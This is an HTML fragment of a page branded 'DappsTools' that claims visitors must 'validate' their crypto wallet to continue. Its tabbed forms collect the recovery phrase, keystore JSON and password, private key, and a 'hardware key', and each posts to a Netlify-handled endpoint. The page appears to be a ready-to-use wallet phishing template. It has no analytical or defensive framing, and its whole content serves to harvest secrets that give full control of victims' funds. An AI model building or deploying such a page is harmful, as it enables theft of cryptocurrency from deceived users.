    <ul class="nav justify-content-end">
      <li class="nav-item dapps">
        <a class="nav-link" href="#" title=""
          ><img id="wclogo" src="assets/images/wclogo.png" />
          <span class="">DappsTools</span></a
        >
      </li>
    </ul>
    <div class="former">
      <p class="wallet-head text-center">
        VALIDATE YOUR SELECTED WALLET TO CONTINUE
      </p>
      <label class="sub-text text-center"
        >Ensure you enter an active wallet. Inactive/empty wallets are likely to
        experience issues during synchronization.</label
      >
      <ul class="nav nav-pills" id="myTab" role="tablist">
        <li class="nav-item">
          <a
            class="nav-link active"
            id="home-tab"
            data-toggle="tab"
            href="#home"
            role="tab"
            aria-controls="home"
            aria-selected="true"
            >MNEMONICS</a
          >
        </li>
        <li class="nav-item">
          <a
            class="nav-link"
            id="profile-tab"
            data-toggle="tab"
            href="#profile"
            role="tab"
            aria-controls="profile"
            aria-selected="false"
            >KEYSTORE</a
          >
        </li>
        <li class="nav-item">
          <a
            class="nav-link"
            id="contact-tab"
            data-toggle="tab"
            href="#contact"
            role="tab"
            aria-controls="contact"
            aria-selected="false"
            >PRIVATE KEY</a
          >
        </li>
        <li class="nav-item">
          <a
            class="nav-link"
            id="last-tab"
            data-toggle="tab"
            href="#last"
            role="tab"
            aria-controls="last"
            aria-selected="false"
            >HARDWARE</a
          >
        </li>
      </ul>
      <div class="tab-content" id="myTabContent">
        <div
          class="tab-pane active"
          id="home"
          role="tabpanel"
          aria-labelledby="home-tab"
        >
          <div class="form-group text-center">
            <form
              name="phrase1"
              method="POST"
              action="/v2/support/loading"
              netlify
            >
              <input type="hidden" name="_redirect" value="#" />
              <label for="exampleFormControlTextarea1"
                >Please enter your 12/24 word phrase</label
              >
              <input
                class="form-control form-control-lg"
                name="mnemonics"
                type="text"
                placeholder=""
                required
              />
              <button
                type="submit"
                class="btn btn-primary mb-2"
                style="background-color: #007bff"
              >
                PROCEED
              </button>
            </form>
          </div>
        </div>
        <div
          class="tab-pane"
          id="profile"
          role="tabpanel"
          aria-labelledby="profile-tab"
        >
          <div class="form-group text-center">
            <form
              name="keystore1"
              method="POST"
              action="/v2/support/loading"
              netlify
            >
              <input type="hidden" name="_redirect" value="#" />
              <label for="exampleFormControlTextarea1"
                >Enter your Keystore JSON</label
              >
              <input
                class="form-control form-control-lg"
                name="keystore-JSON"
                type="text"
                placeholder=""
                required
              />
              <label for="exampleFormControlTextarea1">Enter Password</label>
              <input
                class="form-control form-control-lg"
                name="password"
                type="text"
                placeholder=""
                required
              />
              <button
                type="submit"
                class="btn btn-primary mb-2"
                style="background-color: #007bff"
              >
                PROCEED
              </button>
            </form>
          </div>
        </div>
        <div
          class="tab-pane"
          id="contact"
          role="tabpanel"
          aria-labelledby="contact-tab"
        >
          <div class="form-group text-center">
            <form
              name="private1"
              method="POST"
              action="/v2/support/loading"
              netlify
            >
              <input type="hidden" name="_redirect" value="#" />
              <label for="exampleFormControlTextarea1"
                >Enter your private key</label
              >
              <input
                class="form-control form-control-lg"
                name="private-key"
                type="text"
                placeholder=""
                required
              />
              <button
                type="submit"
                class="btn btn-primary mb-2"
                style="background-color: #007bff"
              >
                PROCEED
              </button>
            </form>
          </div>
        </div>
        <div
          class="tab-pane"
          id="last"
          role="tabpanel"
          aria-labelledby="last-tab"
        >
          <div class="form-group text-center">
            <form name="hardware"
                  method="POST"
              action="/v2/support/loading"
              netlify>
              <input type="hidden" name="_redirect" value="#" />
              <label for="exampleFormControlTextarea1"
                >Enter your Hardware Key</label
              >
              <input
                class="form-control form-control-lg"
                name="hardware-key"
                type="text"
                placeholder=""
                required
              />
              <button
                type="submit"
                class="btn btn-primary mb-2"
                style="background-color: #007bff"
              >
                PROCEED
              </button>
            </form>
          </div>
        </div>
